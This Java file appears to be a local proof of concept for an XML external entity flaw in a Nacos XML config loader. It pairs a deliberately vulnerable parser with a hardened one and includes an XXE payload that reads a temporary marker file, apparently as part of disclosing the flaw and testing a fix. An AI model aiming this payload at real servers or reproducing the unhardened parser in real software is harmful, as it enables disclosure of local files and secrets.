import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.LinkedHashMap;
import java.util.Map;

import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Document;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

/**
 * Local-only XXE demonstration for the Nacos XML parser data flow.
 *
 * The vulnerable parser mirrors the reviewed NacosXmlPropertySourceLoader logic:
 * it creates a default DocumentBuilder and copies expanded text into a map.
 * The hardened parser shows the proposed fail-closed configuration.
 *
 * This program creates, reads, and deletes only its own temporary fixture.
 * It never contacts a network endpoint and never reads a pre-existing file.
 */
public final class XxePoc {

    private static final String DOT = ".";
    private static final String DISALLOW_DOCTYPE_DECL =
            "http://apache.org/xml/features/disallow-doctype-decl";
    private static final String EXTERNAL_GENERAL_ENTITIES =
            "http://xml.org/sax/features/external-general-entities";
    private static final String EXTERNAL_PARAMETER_ENTITIES =
            "http://xml.org/sax/features/external-parameter-entities";
    private static final String LOAD_EXTERNAL_DTD =
            "http://apache.org/xml/features/nonvalidating/load-external-dtd";

    private XxePoc() {
    }

    /** Mirrors the reviewed vulnerable construction. */
    static Map<String, Object> parseVulnerable(InputStream in) throws IOException {
        Map<String, Object> map = new LinkedHashMap<>(32);
        try {
            DocumentBuilder documentBuilder = DocumentBuilderFactory.newInstance()
                    .newDocumentBuilder();
            Document document = documentBuilder.parse(in);
            if (document == null) {
                return null;
            }
            parseNodeList(document.getChildNodes(), map, "");
        }
        catch (Exception e) {
            // Mirrors the reviewed source's exception wrapping.
            throw new IOException("The xml content parse error.", e.getCause());
        }
        return map;
    }

    /** Proposed hardened construction; all security-critical settings fail closed. */
    static Map<String, Object> parseHardened(InputStream in) throws IOException {
        Map<String, Object> map = new LinkedHashMap<>(32);
        try {
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
            factory.setFeature(DISALLOW_DOCTYPE_DECL, true);
            factory.setFeature(EXTERNAL_GENERAL_ENTITIES, false);
            factory.setFeature(EXTERNAL_PARAMETER_ENTITIES, false);
            factory.setFeature(LOAD_EXTERNAL_DTD, false);
            factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
            factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
            factory.setXIncludeAware(false);
            factory.setExpandEntityReferences(false);
            factory.setNamespaceAware(false);
            factory.setValidating(false);

            DocumentBuilder documentBuilder = factory.newDocumentBuilder();
            documentBuilder.setEntityResolver((publicId, systemId) -> {
                throw new SAXException("External entity resolution is disabled");
            });
            Document document = documentBuilder.parse(in);
            if (document == null) {
                return null;
            }
            parseNodeList(document.getChildNodes(), map, "");
        }
        catch (Exception e) {
            throw new IOException("The xml content parse error.", e);
        }
        return map;
    }

    /** The same map-building logic used by the reviewed loader. */
    private static void parseNodeList(NodeList nodeList, Map<String, Object> map,
            String parentKey) {
        if (nodeList == null || nodeList.getLength() < 1) {
            return;
        }
        parentKey = parentKey == null ? "" : parentKey;
        for (int i = 0; i < nodeList.getLength(); i++) {
            Node node = nodeList.item(i);
            String value = node.getNodeValue();
            value = value == null ? "" : value.trim();
            String name = node.getNodeName();
            name = name == null ? "" : name.trim();
            if (isEmpty(name)) {
                continue;
            }

            String key = isEmpty(parentKey) ? name : parentKey + DOT + name;
            parseNodeAttributes(node.getAttributes(), map, key);
            if (node.getNodeType() == Node.ELEMENT_NODE && node.hasChildNodes()) {
                parseNodeList(node.getChildNodes(), map, key);
                continue;
            }
            if (value.length() < 1) {
                continue;
            }
            map.put(parentKey, value);
        }
    }

    private static void parseNodeAttributes(NamedNodeMap nodeMap,
            Map<String, Object> map, String parentKey) {
        if (nodeMap == null || nodeMap.getLength() < 1) {
            return;
        }
        for (int i = 0; i < nodeMap.getLength(); i++) {
            Node node = nodeMap.item(i);
            if (node == null || node.getNodeType() != Node.ATTRIBUTE_NODE) {
                continue;
            }
            if (isEmpty(node.getNodeName()) || isEmpty(node.getNodeValue())) {
                continue;
            }
            map.put(parentKey + DOT + node.getNodeName(), node.getNodeValue());
        }
    }

    private static boolean isEmpty(String value) {
        return value == null || value.isEmpty();
    }

    public static void main(String[] args) throws Exception {
        Path fixtureDirectory = Files.createTempDirectory("xxe-poc-");
        Path fixture = fixtureDirectory.resolve("secret.txt");
        byte[] marker = "CONTROLLED-LOCAL-SECRET\n".getBytes(StandardCharsets.UTF_8);
        Files.write(fixture, marker);

        String payload = "<?xml version=\"1.0\"?>\n"
                + "<!DOCTYPE config [<!ENTITY localMarker SYSTEM \""
                + fixture.toUri() + "\">]>\n"
                + "<config><leaked>&localMarker;</leaked></config>";
        byte[] payloadBytes = payload.getBytes(StandardCharsets.UTF_8);

        try {
            System.out.println("fixture=created-by-this-process");

            try {
                Map<String, Object> result = parseVulnerable(
                        new ByteArrayInputStream(payloadBytes));
                Object leaked = result == null ? null : result.get("config.leaked");
                System.out.println("unhardened.config.leaked=" + leaked);
            }
            catch (IOException e) {
                System.out.println("unhardened=rejected (" + e.getClass().getSimpleName() + ")");
            }

            try {
                Map<String, Object> result = parseHardened(
                        new ByteArrayInputStream(payloadBytes));
                System.out.println("hardened=unexpectedly-accepted " + result);
            }
            catch (IOException e) {
                System.out.println("hardened=rejected (" + e.getClass().getSimpleName() + ")");
            }
        }
        finally {
            Files.deleteIfExists(fixture);
            Files.deleteIfExists(fixtureDirectory);
        }
    }
}
